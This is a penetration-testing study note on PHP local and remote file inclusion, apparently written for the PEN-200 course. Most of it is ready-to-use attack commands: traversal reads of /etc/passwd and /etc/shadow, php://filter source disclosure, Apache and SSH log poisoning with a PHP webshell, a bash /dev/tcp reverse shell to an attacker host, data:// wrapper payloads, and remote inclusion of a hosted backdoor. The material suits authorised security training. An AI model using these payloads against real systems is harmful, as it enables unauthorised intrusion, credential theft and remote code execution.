# LFI — Local File Inclusion

> **PEN-200 Chapter 9.** File Inclusion is more powerful than plain Directory Traversal because an included executable file may be executed in the application's running context.

## Basic LFI / traversal tests

```text
/page.php?file=../../../../etc/passwd
/page.php?file=../../../../etc/shadow
/page.php?file=/proc/self/environ
```

Remember the distinction:

```text
Directory Traversal → primarily reads files
LFI                → includes local files; executable content may run
```

See [[Directory Traversal]].

## `php://filter` — disclose PHP source

Normally, including `admin.php` through LFI executes the PHP. `php://filter` with Base64 lets you retrieve the **source code instead**, which is useful for finding credentials and understanding application logic.

```text
/page.php?file=php://filter/convert.base64-encode/resource=config.php
/page.php?file=php://filter/convert.base64-encode/resource=admin.php
```

Decode:

```bash
echo '<BASE64>' | base64 -d
```

Look for database credentials, reused passwords, include paths, hard-coded secrets, and additional files/endpoints.

## Log Poisoning → RCE

Goal: place executable PHP in a log field we control, then include that log through LFI.

### Apache access log via User-Agent

```bash
# 1. Poison User-Agent
curl -A '<?php echo system($_GET["cmd"]); ?>' http://<TARGET>/

# 2. Include Apache access log and execute command
curl 'http://<TARGET>/page.php?file=../../../../../../var/log/apache2/access.log&cmd=id'
```

Apache commonly records the User-Agent in `access.log`.

If commands contain spaces, URL encode them:

```text
ls -la  → ls%20-la
```

Avoid repeatedly sending the poisoned User-Agent when including the log, otherwise the PHP snippet can be written multiple times and execute multiple times.

### SSH log poisoning

```bash
ssh '<?php system($_GET["cmd"]); ?>'@<TARGET>
/page.php?file=/var/log/auth.log&cmd=whoami
```

Whether this works depends on what is logged and whether the web-server process can read that log.

## Reverse shell through PHP `system()`

A command invoked by PHP `system()` may run through `/bin/sh`. If using Bash-specific reverse-shell syntax, explicitly invoke Bash:

```bash
bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
```

URL-encode special characters before placing it in a query parameter. Start listener first:

```bash
nc -nvlp 4444
```

## `data://` wrapper → RCE

`data://` can embed data directly into the included resource. It may provide RCE when log poisoning is unavailable.

Plaintext example:

```text
?page=data://text/plain,<?php%20echo%20system('id');?>
```

Base64 form can help bypass simple filters:

```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

```text
?page=data://text/plain;base64,<BASE64>&cmd=id
```

**Requirement:** PHP `allow_url_include` must be enabled; it is disabled by default in current PHP versions.

## RFI — Remote File Inclusion

RFI includes attacker-controlled content from a remote system and executes it in the web application's context.

**Requirement in PHP:** `allow_url_include` must be enabled, so RFI is less common than LFI.

Kali has ready-made web shells:

```bash
ls -la /usr/share/webshells/php/
cat /usr/share/webshells/php/simple-backdoor.php
```

Host the payload:

```bash
cd /usr/share/webshells/php/
python3 -m http.server 80
```

Include it remotely:

```bash
curl 'http://<TARGET>/index.php?page=http://<LHOST>/simple-backdoor.php&cmd=ls'
```

RFI may also use SMB depending on application/server behavior.

## Windows LFI notes

Paths and log locations are application-specific. For XAMPP/Apache, check:

```text
C:\xampp\apache\logs\
```

The PHP `system()` function itself is OS-independent, but the command syntax/payload must match Windows or Linux.

Related: [[Directory Traversal]] · [[File Upload Bypass]] · [[Command Injection]]
